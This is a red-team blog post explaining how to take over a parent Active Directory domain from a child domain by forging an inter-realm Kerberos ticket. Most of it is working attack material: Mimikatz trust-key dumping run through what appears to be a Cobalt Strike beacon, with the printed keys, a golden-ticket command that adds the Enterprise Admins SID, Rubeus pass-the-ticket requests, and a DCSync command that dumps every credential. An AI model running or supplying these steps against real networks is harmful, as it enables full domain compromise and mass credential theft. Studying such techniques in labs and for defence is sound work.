---
layout: post
title: Inter-Realm TGT, jumping through domains
categories:
- Microsoft
- Active Directory
tags:
- redteam
- kerberos
- windows
- ad
lang: en
date: 2024-05-18 16:00 +0100
description: In this article, I will show you how to instantly compromise a Parent domain thanks to Inter-Realm TGT.
image: "/assets/img/InterRealmTGT/interrealmtgt.svg"
---

## Summary
In this article, I will show you how to instantly compromise a Parent domain thanks to `Inter-Realm TGT`.

## Prerequisites
- Domain Admins rights on local domain
- Local domain should be trusted by targeted domain
- SID Filtering should be disabled between the two domains (case of a Parent/Child trust)

## Inter-realm key 

### What are inter-realm keys ? 

[Microsoft](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)?redirectedfrom=MSDN#inter-realm-keys) on inter-realm keys (or trust keys): 

> In order for cross-realm authentication to occur, the KDCs must share an inter-realm key. The realms can then trust each other because they share the key.

> Active Directory domains that have a parent-child relationship share an inter-realm key. This inter-realm key is the basis of transitive trusts in Windows 2000 and Windows Server 2003. If a shortcut trust is created, the two domains will exchange a key specifically for their trust.

Therefore, we will need an inter-realm key to build our inter-realm TGT!

### Get an inter-realm key

In this example, we are on **DEV.ADMIN.ASGARD.LOCAL** and we want to access the parent domain **ADMIN.ASGARD.LOCAL**.

A Parent/Child trust exist between DEV.ADMIN.ASGARD.LOCAL and ADMIN.ASGARD.LOCAL, this trust is a **two-way transitive trust** which by default doesn't have SID Filtering:

![forest](/assets/img/InterRealmTGT/interrealmtgt.svg)

In order to retrieve inter-realm keys, it is possible to use the `lsadump::trust "/patch"` command from `Mimikatz` on the Domain Controller.

```console
beacon> mimikatz lsadump::trust "/patch"  
[*] Tasked beacon to run mimikatz's lsadump::trust "/patch" command  
[+] host called home, sent: 787056 bytes  
[+] received output:   
Current domain: DEV.ADMIN.ASGARD.LOCAL (DEV / S-1-5-21-1416445593-394318334-2645530711)   
Domain: ADMIN.ASGARD.LOCAL (ADMIN / S-1-5-21-1216317506-3509444512-4230742538)  
[ In ] DEV.ADMIN.ASGARD.LOCAL -> ADMIN.ASGARD.LOCAL  
* 12/19/2022 10:40:37 PM - CLEAR - 18 8a a4 c1 dd e9 b3 09 b3 0e 3e 92 1c 57 41 82 37 7c e5 93 8f bf 02 b6 d1 b4 1c 3d 87 92 8a 3b 07 a6 4b a9 d6 9f 51 d4 f4 0e b9 60 49 a8 41 6e 9a 5c 12 9a fc b7 06 cb 38 ed 30 e5 01 91 78 b3 cf fd 72 56 75 83 91 76 37 74 1a 3a 18 87 f9 99 a9 48 ee f4 21 fb 7c 10 d0 0b e8 66 41 c3 c8 9f a2 1d 10 24 77 fb 21 22 51 fd 59 fd 89 f9 46 58 c6 28 85 7d 0a 24 ed 27 3c d6 38 c9 86 d9 97 6d 0c 03 26 9b 27 ec 63 42 91 5a a8 f7 e5 3e 92 0a ef 56 3a 35 b0 eb eb c2 7f 3b f4 21 08 26 83 7a 39 e4 ef a2 c4 de d4 ff 7d f3 bc 28 73 e7 6c 28 48 48 68 21 f7 ba 83 91 96 de 82 88 94 82 73 a0 f7 4b cc e4 a1 92 a9 5d 40 d8 05 5c 99 83 11 5a a8 86 12 f4 25 cd 0a e0 1b 5f ab 39 05 1a c2 0a 57 97 b3 40 97 e9 ad 37 dc 0c 0b 50 05 91 13 e6 d  
* aes256_hmac 21d271b09dd2e854540d347f2d1e7b3b66df4bc7e49dfea9fa9596331e704421  
* aes128_hmac 4d8bce9ef967078aa8885edbee194b3d  
* rc4_hmac_nt ae88fb9f9913cf65971234ac5d8638a1   
[ Out ] ADMIN.ASGARD.LOCAL -> DEV.ADMIN.ASGARD.LOCAL  
* 12/19/2022 10:40:11 PM - CLEAR - 62 b7 66 ee 53 91 c0 10 23 7c 6b 0c c7 79 fa 89 a5 e7 85 8d b2 f9 4a f1 a7 5d 64 ef d0 e0 27 25 9d 86 92 aa c5 56 20 9b cd 44 9b 17 9f 1f 20 f5 38 45 ee 35 e1 b9 2c 1e 27 96 57 36 bf 76 c1 a1 30 ca af 69 b6 85 a1 ca d5 3d 59 81 3b f6 f6 62 e7 16 eb db a4 f8 0e 2c 96 88 8d d5 eb f1 79 25 ea 8a 88 fd 77 8c b0 d5 3a dc 64 e3 43 4b 65 86 14 66 0a 1a 8e ff 03 36 21 64 3f eb 51 2c ee 8c e6 0f b6 ad c6 0d c1 9c 0f 24 2b 6d 04 b6 30 12 02 5f fc 4d 4c 93 e5 a8 28 61 d8 0e 18 ee 59 33 46 8a 6d 90 0d a3 08 e4 ab 81 25 44 20 70 85 59 2c 96 71 24 e2 a0 39 7b d0 43 4f b8 a8 3a 43 46 eb 89 b3 dc ef 8a 59 51 de ea e1 12 e9 75 95 d3 15 27 ee be fb 19 55 c7 43 d8 1a 58 f4 0d 5c 79 ce df 3d 54 a9 4f 33 0c 62 0d 2e 52 4d 8a 79 74  
* aes256_hmac fcccd525ee51bcc04cc7ce3addd13a4ea34d227789c02ad6de6591d4aaafda77  
* aes128_hmac c9893e16065f9555978e3f923d037d06  
* rc4_hmac_nt c4e059ade32175248a2188bf6814bab8   
```

The inter-realm key we want to use here, is the **RC4** key of the `[ In ] DEV.ADMIN.ASGARD.LOCAL -> ADMIN.ASGARD.LOCAL` part: `ae88fb9f9913cf65971234ac5d8638a1`

## Forge Inter-Realm TGT

In order to forge the inter-realm TGT, we can use mimikatz `kerberos::golden` with the following parameters:
- `user`: user to impersonate
- `domain`: current domain
- `sid`: current domain SID
- `sids`: target domain Enterprise Admin SID \<domain sid>-519
- `rc4`: inter-realm key
- `service`: krbtgt
- `target`: target domain
- `ticket`: ticket output file

```bat
mimikatz.exe kerberos::golden /user:Administrator /domain:DEV.ADMIN.ASGARD.LOCAL /sid:"S-1-5-21-1416445593-394318334-2645530711" /sids:"S-1-5-21-1216317506-3509444512-4230742538-519" /rc4:"ae88fb9f9913cf65971234ac5d8638a1" /service:krbtgt /target:ADMIN.ASGARD.LOCAL /ticket:interrealmtgt.kirbi
```

### Post-Exploitation

After forging the inter-realm TGT, we can now retrieve Service Tickets for any services on "ADMIN.ASGARD.LOCAL":
```bat
Rubeus.exe asktgs /service:cifs/DC.admin.asgard.local /dc:DC.admin.asgard.local /ticket:interrealmtgt.kirbi /ptt

Rubeus.exe asktgs /service:ldap/DC.admin.asgard.local /dc:DC.admin.asgard.local /ticket:interrealmtgt.kirbi /ptt  
```

And perform a DCSync attack for example:
```bat
mimikatz.exe "lsadump::dcsync /domain:admin.asgard.local /all /csv"
```

## References/Resources

- [https://adsecurity.org/?p=1588](https://adsecurity.org/?p=1588)
- [https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72](https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72)
- [https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d)
- [https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10))
- [https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)